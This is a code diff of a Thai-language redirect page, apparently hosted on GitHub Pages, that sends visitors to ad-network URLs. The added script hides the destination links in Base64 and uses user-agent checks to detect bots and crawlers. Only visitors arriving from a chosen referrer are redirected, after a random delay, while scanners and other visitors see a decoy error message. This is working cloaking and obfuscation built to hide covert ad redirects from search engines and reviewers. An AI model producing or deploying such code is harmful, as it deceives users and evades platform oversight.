@@ -1,11 +1,55 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="0; url=https://www.profitableratecpm.com/vibu5m81hm?key=d479844987297a1250da337216c4a4a8">
-  <title>กำลังเปลี่ยนทาง...</title>
+  <meta charset="UTF-8" />
+  <title>กำลังเปลี่ยนเส้นทาง...</title>
+  <meta name="robots" content="noindex, nofollow" />
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      text-align: center;
+      padding-top: 60px;
+      font-family: sans-serif;
+    }
+  </style>
+  <script>
+    // ลิงก์โฆษณาที่เข้ารหัส Base64 สองลิงก์ (แก้ Base64 ให้ถูกต้อง)
+    const links = [
+      "aHR0cHM6Ly93d3cucHJvZml0YWJsZXJhdGVjcG0uY29tL3ZpYnU1bTgxaG0/a2V5PWQ0Nzk4NDQ5ODcyOTdhMTI1MGRhMzM3MjE2YzRhNGE4",
+      "aHR0cHM6Ly9vdGlldS5jb20vNC85MTc5NTU3"
+    ];
+
+    // ตรวจบอทจาก user-agent
+    const ua = navigator.userAgent.toLowerCase();
+    const isBot = /bot|crawl|spider|slurp|mediapartners|google|facebookexternalhit|fetch|monitoring/i.test(ua);
+
+    // ตรวจ referrer (ต้องมาจากโดเมนของคุณ)
+    const expectedRef = "blackcloverth.github.io";
+    const actualRef = document.referrer.toLowerCase();
+
+    function shouldRedirect() {
+      return !isBot && actualRef.includes(expectedRef);
+    }
+
+    // เริ่ม redirect แบบสุ่ม
+    function go() {
+      if (shouldRedirect()) {
+        const randomIndex = Math.floor(Math.random() * links.length);
+        const finalUrl = atob(links[randomIndex]);
+        const delay = Math.floor(Math.random() * 800) + 300; // หน่วงเวลา 300-1100ms
+        setTimeout(() => {
+          window.location.href = finalUrl;
+        }, delay);
+      } else {
+        document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>คุณอาจเข้าผิดลิงก์ หรือระบบป้องกันบล็อกไว้</p>";
+      }
+    }
+
+    window.onload = go;
+  </script>
 </head>
-<body style="background:#111;color:#fff;text-align:center;padding-top:50px;font-family:sans-serif">
+<body>
   <h1>กำลังเปลี่ยนเส้นทาง กรุณารอสักครู่...</h1>
 </body>
 </html>
